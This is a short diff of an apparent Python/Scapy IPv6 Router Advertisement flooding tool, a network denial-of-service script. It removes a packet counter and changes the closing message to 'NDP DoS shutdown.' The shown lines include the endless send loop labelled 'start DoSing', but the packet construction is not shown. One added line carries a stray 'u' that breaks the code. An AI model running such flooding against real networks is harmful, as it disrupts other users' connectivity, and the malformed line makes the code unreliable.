@@ -14,7 +14,6 @@ def initialize():
 		return
 
 	conf.verb = 0
-	count = 0
 
 	print '[!] Starting Router Advertisement...'
 
@@ -26,7 +25,6 @@ def initialize():
 	# start DoSing...
 	try:
 		send(pkt, loop=1, inter=0.1)
-		count += 1
 	except:
 		pass
-	print '[+] Done.  Sent %d advertisements.'%count
+u	print '[+] NDP DoS shutdown.'
